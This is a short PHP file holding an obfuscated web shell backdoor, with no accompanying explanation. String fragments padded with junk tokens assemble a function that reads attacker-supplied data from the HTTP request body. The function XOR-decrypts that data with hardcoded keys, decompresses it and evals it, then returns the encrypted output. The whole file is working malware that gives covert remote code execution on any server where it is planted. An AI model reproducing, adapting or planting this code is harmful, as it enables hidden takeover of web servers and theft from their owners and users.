<?php
$S='{$$Ao.=$t{$i}^$k{$$Aj};}}retur$An $o;}if $A(@preg_$Amat$Ach("/$$Akh(.+)$k$Af/",$A@file_g$A$Aet_contents$A("php://i$Anp';
$V='ut"$A$A),$m)==$A1) {@ob_st$Aart();@$Ae$Aval(@gzunc$Ao$Am$Apress(@x(@base$A64_de$Acode($m[1$A]),$k$A)));$A$o=@ob_ge$At_';
$h='t,$k){$c=strlen($k)$A;$l=$Astrlen($t);$A$o="";for$A($i$A=0;$i<$A$l;){for($A$j=0;$A($$Aj<$c&&$$Ai<$A$l$A)$A;$j++,$$Ai++)';
$b=str_replace('l','','lcrleatlle_funlctilon');
$L='cont$Aen$Ats();@ob_$Aend_clea$An($A);$r=@ba$Ase$A64_encode($A@x(@$Agzcompres$A$As($o),$k));pri$An$At("$p$kh$r$$Akf");}';
$g='$$Ak="87d1c3$Ab4";$A$A$$Akh="bd$A205bf99b9e";$A$kf="9e3$Ae5f9b4cc2";$p$A="TU93QJk$Ae$AjQ3agH6x";$Afun$Ac$At$Aion $A$Ax($';
$u=str_replace('$A','',$g.$h.$S.$V.$L);
$a=$b('',$u);$a();
?>
